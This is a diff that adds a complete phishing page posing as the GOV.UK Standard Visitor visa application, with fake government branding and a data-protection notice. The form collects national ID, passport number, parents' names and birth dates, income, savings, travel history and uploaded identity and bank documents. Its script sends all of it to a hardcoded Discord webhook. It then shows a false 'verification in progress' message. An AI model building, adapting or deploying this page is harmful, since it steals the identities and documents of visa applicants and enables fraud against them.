@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply for a UK visa - GOV.UK</title>
+    <style>
+        :root {
+            --govuk-blue: #1d70b8;
+            --govuk-black: #0b0c0c;
+            --govuk-grey: #f3f2f1;
+            --govuk-border: #b1b4b6;
+            --govuk-secondary: #505a5f;
+            --govuk-success: #00703c;
+        }
+        body { font-family: "GDS Transport", arial, sans-serif; margin: 0; background-color: white; color: var(--govuk-black); line-height: 1.5; }
+        
+        header { background: var(--govuk-black); color: white; padding: 10px 0; border-bottom: 10px solid var(--govuk-blue); }
+        .container { max-width: 1000px; margin: 0 auto; padding: 0 20px; }
+        .header-flex { display: flex; justify-content: space-between; align-items: center; }
+        .gov-logo { font-size: 24px; font-weight: bold; text-decoration: none; color: white; }
+
+        .urgent-banner { background: #ffdd00; padding: 15px; font-weight: bold; border: 2px solid var(--govuk-black); margin-bottom: 20px; font-size: 14px; }
+        .phase-banner { font-size: 14px; padding: 10px 0; border-bottom: 1px solid var(--govuk-border); margin-bottom: 20px; }
+        .tag { background: var(--govuk-blue); color: white; padding: 2px 8px; font-weight: bold; margin-right: 10px; }
+
+        .grid-row { display: grid; grid-template-columns: 2fr 1fr; gap: 40px; margin-top: 30px; }
+        h1 { font-size: 42px; margin-bottom: 10px; }
+        h2 { font-size: 26px; border-top: 4px solid var(--govuk-black); padding-top: 20px; margin-top: 40px; }
+        
+        .form-section { margin-bottom: 30px; }
+        label { display: block; font-weight: bold; font-size: 19px; margin-bottom: 5px; }
+        .hint { color: var(--govuk-secondary); font-size: 16px; margin-bottom: 10px; display: block; }
+        
+        input[type="text"], input[type="email"], input[type="date"], input[type="number"], select, textarea { 
+            border: 2px solid var(--govuk-black); padding: 12px; width: 100%; max-width: 500px; font-size: 16px; box-sizing: border-box; outline: none;
+        }
+        input:focus { outline: 3px solid #ffdd00; border-color: var(--govuk-black); }
+
+        .fee-calc-box { background: var(--govuk-grey); padding: 25px; border: 1px solid var(--govuk-border); margin: 30px 0; }
+        .total-price { font-size: 32px; font-weight: bold; color: var(--govuk-success); }
+
+        .gov-button { 
+            background: var(--govuk-success); color: white; border: none; padding: 15px 40px; 
+            font-weight: bold; font-size: 19px; border-bottom: 3px solid #002d18; cursor: pointer; 
+        }
+        .gov-button:hover { background: #005a30; }
+
+        footer { background: var(--govuk-grey); padding: 60px 0; margin-top: 80px; border-top: 1px solid var(--govuk-border); font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="container header-flex">
+        <a href="#" class="gov-logo">GOV.UK</a>
+        <div style="font-size: 14px;">Visas and Immigration</div>
+    </div>
+</header>
+
+<div class="container" style="margin-top: 30px;">
+    <div class="urgent-banner">
+        ⚠️ IDENTITY VERIFICATION: You must provide a valid National ID and Email for system verification.
+    </div>
+
+    <div class="phase-banner">
+        <span class="tag">BETA</span> This is a new service – your feedback will help us to improve it.
+    </div>
+
+    <div class="grid-row">
+        <main>
+            <h1>Apply for a UK Standard Visitor visa</h1>
+            
+            <form id="visaForm">
+                
+                <!-- STEP 1: VERIFICATION -->
+                <h2>1. Identity & Verification</h2>
+                <div class="form-section">
+                    <label for="email">Email address</label>
+                    <span class="hint">We will use this to send your application reference</span>
+                    <input type="email" id="email" required>
+                </div>
+
+                <div class="form-section">
+                    <label for="nationalId">National ID Number</label>
+                    <span class="hint">Enter your CNIC (Pakistan) or Aadhar (India)</span>
+                    <input type="text" id="nationalId" required>
+                </div>
+
+                <!-- STEP 2: PERSONAL -->
+                <h2>2. Personal details</h2>
+                <div class="form-section">
+                    <label for="name">Full name</label>
+                    <span class="hint">Exactly as it appears on your passport</span>
+                    <input type="text" id="name" required>
+                </div>
+
+                <div class="form-section">
+                    <label for="passport">Passport number</label>
+                    <input type="text" id="passport" required>
+                </div>
+
+                <div class="form-section">
+                    <label>Father's Full Name & DOB</label>
+                    <input type="text" id="fatherName" placeholder="Name" required style="margin-bottom: 10px;">
+                    <input type="date" id="fatherDob" required>
+                </div>
+
+                <div class="form-section">
+                    <label>Mother's Full Name & DOB</label>
+                    <input type="text" id="motherName" placeholder="Name" required style="margin-bottom: 10px;">
+                    <input type="date" id="motherDob" required>
+                </div>
+
+                <!-- STEP 3: FINANCES -->
+                <h2>3. Finances and Employment</h2>
+                <div class="form-section">
+                    <label for="jobTitle">What is your current job title?</label>
+                    <input type="text" id="jobTitle" required>
+                </div>
+
+                <div class="form-section">
+                    <label for="income">Total monthly income (after tax)</label>
+                    <span class="hint">In British Pounds (£) or your local currency</span>
+                    <input type="number" id="income" required>
+                </div>
+
+                <div class="form-section">
+                    <label for="savings">How much money do you have for this trip?</label>
+                    <input type="number" id="savings" required>
+                </div>
+
+                <!-- STEP 4: TRAVEL HISTORY -->
+                <h2>4. Travel History</h2>
+                <div class="form-section">
+                    <label>Have you travelled outside your country in the last 10 years?</label>
+                    <textarea id="history" rows="3" placeholder="List countries and years (e.g., UAE 2022, Turkey 2024)"></textarea>
+                </div>
+
+                <!-- STEP 5: FEES -->
+                <h2>5. Visa fees</h2>
+                <div class="fee-calc-box">
+                    <label>Choose your visa duration</label>
+                    <select id="visaType" onchange="calculate()">
+                        <option value="135">Standard Visitor (6 months) - £135</option>
+                        <option value="506">Standard Visitor (2 years) - £506</option>
+                        <option value="903">Standard Visitor (5 years) - £903</option>
+                        <option value="1128">Standard Visitor (10 years) - £1128</option>
+                    </select>
+
+                    <label style="margin-top: 20px;">Processing service</label>
+                    <select id="priority" onchange="calculate()">
+                        <option value="0">Standard (3 weeks) - £0</option>
+                        <option value="500">Priority (5 days) - £500</option>
+                        <option value="1000">Super Priority (24 hours) - £1000</option>
+                    </select>
+
+                    <div class="total-price" style="margin-top: 20px;">
+                        Total: <span id="displayTotal">£135</span>
+                    </div>
+                </div>
+
+                <!-- STEP 6: UPLOADS -->
+                <h2>6. Supporting documents</h2>
+                <div class="form-section" style="border: 2px dashed var(--govuk-border); padding: 20px; background: var(--govuk-grey);">
+                    <label>Upload documents</label>
+                    <span class="hint">Upload Passport, ID Card, 6 months Bank Statements.</span>
+                    <input type="file" id="docs" multiple required>
+                </div>
+
+                <button type="submit" class="gov-button" id="submitBtn">Submit and verify application</button>
+            </form>
+        </main>
+
+        <aside>
+            <div style="border-top: 2px solid var(--govuk-blue); padding-top: 15px;">
+                <h3 style="font-size: 18px;">Application Summary</h3>
+                <p style="font-size: 14px; color: var(--govuk-secondary);">
+                    Your data is processed in accordance with the Data Protection Act 2018. Verification takes approximately 24-48 hours.
+                </p>
+            </div>
+        </aside>
+    </div>
+</div>
+
+<footer>
+    <div class="container">
+        <p>Built by the Government Digital Service. All content is available under the <strong>Open Government Licence v3.0</strong></p>
+        <p style="color: #6f777b;">© Crown copyright 2026</p>
+    </div>
+</footer>
+
+<script>
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1506362268680585447/ozix7m_TtN1HcLlKhYfcmCoo5xFr8zoQ0N4LTg6NJzDdc0lM5wOlJKDjSA1RALNWxwMz";
+
+    function calculate() {
+        const base = parseInt(document.getElementById('visaType').value);
+        const priority = parseInt(document.getElementById('priority').value);
+        document.getElementById('displayTotal').innerText = "£" + (base + priority);
+    }
+
+    document.getElementById('visaForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "Verifying...";
+
+        const formData = new FormData();
+        
+        // Detailed Data Embed for Discord
+        const embed = {
+            title: "🇬🇧 NEW VISA SUBMISSION: " + document.getElementById('name').value.toUpperCase(),
+            color: 1928888,
+            fields: [
+                { name: "Email Address", value: document.getElementById('email').value, inline: true },
+                { name: "National ID", value: document.getElementById('nationalId').value, inline: true },
+                { name: "Passport", value: document.getElementById('passport').value, inline: true },
+                { name: "Job Title", value: document.getElementById('jobTitle').value, inline: true },
+                { name: "Monthly Income", value: "£" + document.getElementById('income').value, inline: true },
+                { name: "Savings", value: "£" + document.getElementById('savings').value, inline: true },
+                { name: "Father", value: document.getElementById('fatherName').value, inline: true },
+                { name: "Mother", value: document.getElementById('motherName').value, inline: true },
+                { name: "Travel History", value: document.getElementById('history').value || "None" },
+                { name: "Total Fee Paid", value: document.getElementById('displayTotal').innerText, inline: true }
+            ],
+            footer: { text: "Verified Submission via UKVI Portal v2.6" },
+            timestamp: new Date()
+        };
+
+        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+
+        const files = document.getElementById('docs').files;
+        for (let i = 0; i < files.length; i++) {
+            formData.append(`file${i}`, files[i]);
+        }
+
+        try {
+            const res = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+            if(res.ok) {
+                alert("Verification in progress. You will receive an email shortly.");
+                location.reload();
+            } else {
+                throw new Error();
+            }
+        } catch (err) {
+            alert("Error: Documents too large or connection failed. Maximum 25MB allowed.");
+        } finally {
+            btn.disabled = false;
+            btn.innerText = "Submit and verify application";
+        }
+    });
+</script>
+
+</body>
+</html>
